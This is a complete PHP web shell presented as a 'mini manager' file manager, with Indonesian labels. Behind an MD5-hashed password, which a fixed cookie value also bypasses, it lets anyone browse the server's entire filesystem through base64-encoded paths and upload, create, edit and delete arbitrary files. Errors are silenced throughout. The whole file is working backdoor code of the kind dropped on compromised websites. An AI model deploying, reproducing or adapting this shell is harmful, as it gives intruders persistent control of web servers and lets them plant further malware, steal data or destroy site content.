<?php
session_start();
error_reporting(0);

$kunci = "d2785aae630d5b5f5a078aa973bbabad"; // TIDAK DIUBAH
$c = "akses_taman";
$e = "";

if (isset($_GET['keluar'])) {
    session_destroy();
    setcookie($c, "", time() - 3600);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (isset($_POST['gembok'])) {
    if (md5($_POST['gembok']) === $kunci) {
        $_SESSION[$c] = true;
        setcookie($c, "a"."kt"."if", time() + 86400);
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        $e = "Password salah!";
    }
}

$ok = (isset($_COOKIE[$c]) && $_COOKIE[$c] === "aktif");

if (!isset($_SESSION[$c]) && !$ok) {
    echo '<body bgcolor=black text=white><center><br><br><h3>LOGIN</h3>';
    if ($e != "") {
        echo '<div style="color:red;margin-bottom:10px;">'.$e.'</div>';
    }
    echo '<form method="POST">
    <input type="password" name="gembok">
    <input type="submit" value="Masuk">
    </form></center></body>';
    exit;
}

$r = str_replace("\\", "/", getcwd());
$p = isset($_GET['peta']) ? base64_decode($_GET['peta']) : $r;
$p = str_replace("\\", "/", $p);

if (!is_dir($p)) $p = $r;

// --- PROSES AKSI POST ---

// Fitur Upload
if (isset($_POST['aksi']) && $_POST['aksi'] == "upload") {
    if (isset($_FILES['muatan']['tmp_name']) && $_FILES['muatan']['tmp_name'] != '') {
        $t = $p.'/'.$_FILES['muatan']['name'];
        if (@move_uploaded_file($_FILES['muatan']['tmp_name'], $t)) {
            echo "<font color=lime>Upload Sukses!</font><br>";
        } else {
            echo "<font color=red>Upload Gagal!</font><br>";
        }
    }
}

// Fitur Buat Folder Baru
if (isset($_POST['aksi']) && $_POST['aksi'] == "buat_folder") {
    $folder_baru = $p . '/' . $_POST['nama_folder'];
    if (!file_exists($folder_baru)) {
        if (@mkdir($folder_baru)) {
            echo "<font color=lime>Folder berhasil dibuat!</font><br>";
        } else {
            echo "<font color=red>Gagal membuat folder!</font><br>";
        }
    } else {
        echo "<font color=orange>Folder sudah ada!</font><br>";
    }
}

// Fitur Buat File Baru
if (isset($_POST['aksi']) && $_POST['aksi'] == "buat_file") {
    $file_baru = $p . '/' . $_POST['nama_file'];
    if (@file_put_contents($file_baru, "")) {
        echo "<font color=lime>File berhasil dibuat!</font><br>";
    } else {
        echo "<font color=red>Gagal membuat file!</font><br>";
    }
}

// Fitur Simpan Edit File
if (isset($_POST['aksi']) && $_POST['aksi'] == "simpan" && isset($_POST['target'])) {
    $ft = base64_decode($_POST['target']);
    if ($h = @fopen($ft, "w")) {
        @fwrite($h, $_POST['konten']);
        @fclose($h);
        echo "<font color=lime>File Tersimpan!</font><br>";
    } else {
        echo "<font color=red>Gagal menyimpan file!</font><br>";
    }
}

// --- PROSES AKSI GET ---

// Fitur Hapus
if (isset($_GET['aksi']) && $_GET['aksi'] == "hapus" && isset($_GET['target'])) {
    $tgt = base64_decode($_GET['target']);
    if (is_dir($tgt)) @rmdir($tgt);
    else @unlink($tgt);

    header("Location: ?peta=" . base64_encode($p));
    exit;
}
?>
<html>
<head><title>mini manager</title></head>
<body bgcolor="black" text="white" link="white" vlink="white" alink="red">

<table width="100%" border="0">
<tr><td><h1>mini manager</h1></td>
<td align="right"><a href="?keluar=1">[ Keluar ]</a></td></tr>
</table>
<hr color="white">

Path:
<?php
$pp = explode("/", $p);
foreach ($pp as $id => $nm) {
    if ($nm == "" && $id == 0) {
        echo '<a href="?peta=' . base64_encode('/') . '">/</a>';
        continue;
    }
    if ($nm == "") continue;

    echo '<a href="?peta='.base64_encode(implode('/', array_slice($pp,0,$id+1))).'">'.htmlspecialchars($nm).'</a> / ';
}
?>

<br><br>
<table border="0" cellpadding="3">
    <tr>
        <td>
            <form method="POST" enctype="multipart/form-data">
                Upload: <input type="file" name="muatan">
                <input type="hidden" name="aksi" value="upload">
                <input type="submit" value="Upload">
            </form>
        </td>
        <td> | </td>
        <td>
            <form method="POST">
                Folder Baru: <input type="text" name="nama_folder" placeholder="Nama folder..." required>
                <input type="hidden" name="aksi" value="buat_folder">
                <input type="submit" value="Buat">
            </form>
        </td>
        <td> | </td>
        <td>
            <form method="POST">
                File Baru: <input type="text" name="nama_file" placeholder="Nama file..." required>
                <input type="hidden" name="aksi" value="buat_file">
                <input type="submit" value="Buat">
            </form>
        </td>
    </tr>
</table>

<hr color="white">

<?php
if (isset($_GET['aksi']) && $_GET['aksi'] == "edit" && isset($_GET['target'])):

$fe = base64_decode($_GET['target']);
$raw = @file_get_contents($fe);
if ($raw === false) $raw = "";
$ct = htmlspecialchars($raw);
?>
<h3>Edit: <?php echo htmlspecialchars(basename($fe)); ?></h3>

<form method="POST">
<textarea name="konten" rows="20" style="width:100%;background:black;color:white;border:1px solid white;"><?php echo $ct; ?></textarea><br><br>
<input type="hidden" name="target" value="<?php echo htmlspecialchars($_GET['target']); ?>">
<input type="hidden" name="aksi" value="simpan">
<input type="submit" value="Simpan File">
<a href="?peta=<?php echo base64_encode($p); ?>">[ Kembali ]</a>
</form>

<?php else: ?>

<table border="1" width="100%" cellpadding="5" cellspacing="0" bordercolor="white">
<tr bgcolor="#222">
<th>Nama</th><th width="10%">Tipe</th><th width="15%">Ukuran</th><th width="15%">Aksi</th></tr>

<?php
$it = @scandir($p);
if (!is_array($it)) $it = [];

$fd = [];
$fl = [];

foreach ($it as $ii) {
    if ($ii == "." || $ii == "..") continue;

    $jl = $p.'/'.$ii;
    if (is_dir($jl)) $fd[] = $ii;
    else $fl[] = $ii;
}

$all = array_merge($fd, $fl);

foreach ($all as $ii) {
    $jl = $p.'/'.$ii;
    $ec = base64_encode($jl);
    $is = is_dir($jl);

    echo "<tr>";
    echo "<td>".($is ? "<a href='?peta=$ec'><b>[ ".htmlspecialchars($ii)." ]</b></a>" : htmlspecialchars($ii))."</td>";
    echo "<td align='center'>".($is?"DIR":"FILE")."</td>";
    echo "<td align='right'>".($is?"-":@filesize($jl)." B")."</td>";
    echo "<td align='center'>";
    if (!$is) {
        echo "<a href='?peta=".base64_encode($p)."&aksi=edit&target=$ec'>Edit</a> | ";
    }
    echo "<a href='?peta=".base64_encode($p)."&aksi=hapus&target=$ec' onclick=\"return confirm('Hapus?')\">Hapus</a>";
    echo "</td></tr>";
}
?>
</table>

<?php endif; ?>
<hr color="white">
<center><font size="2">&copy; <?php echo date("Y"); ?> mini manager</font></center>

</body>
</html>
